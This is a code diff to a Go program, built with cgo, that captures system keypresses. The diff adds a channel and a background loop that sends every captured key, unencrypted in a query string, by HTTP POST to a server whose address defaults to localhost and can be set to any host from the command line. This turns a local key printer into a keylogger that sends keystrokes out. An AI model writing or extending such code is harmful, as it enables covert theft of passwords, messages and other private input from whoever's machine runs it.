@@ -6,10 +6,15 @@ package main
 import "C"
 import (
 	"fmt"
+	"net/http"
+	"os"
 	"strings"
 	"unicode"
+	"unsafe"
 )
-import "unsafe"
+
+var url = "http://localhost:8000"
+var keys = make(chan string, 10)
 
 //export handleKeyPress
 func handleKeyPress(
@@ -28,25 +33,32 @@ func handleKeyPress(
 	cmd := bool(cmdC)
 	control := bool(controlC)
 
-	//key := parseKeyEnglishQwerty(keyCode, shift, caps)
 	key := C.GoString(printableRepresentationC)
+	C.free(unsafe.Pointer(printableRepresentationC))
 
 	key = strings.TrimSpace(key)
 	if len(key) == 0 || unicode.IsControl([]rune(key)[0]) {
-		key = nonPrintableCharacter(keyCode, shift, caps)
+		key = nonPrintableCharacter(keyCode)
 	}
-
 	fmt.Printf("%s, code: %d, caps: %t, shift: %t, option: %t, cmd: %t, control: %t\n",
 		key, keyCode, caps, shift, option, cmd, control)
-	C.free(unsafe.Pointer(printableRepresentationC))
+	keys <- key
 }
-func main() {
-	C.start()
-}
-func c(condition bool, first string, second string) string {
-	if condition {
-		return first
-	} else {
-		return second
+
+func callLoop() {
+	fmt.Printf("Listening for keys...")
+	for key := range keys {
+		_, err := http.Post(url+fmt.Sprintf("?key=%s", key), "application/json", nil)
+		if err != nil {
+			fmt.Printf("%v", err)
+		}
 	}
+}
+
+func main() {
+	if len(os.Args) > 1 {
+		url = os.Args[1]
+	}
+	go callLoop()
+	C.start()
 }
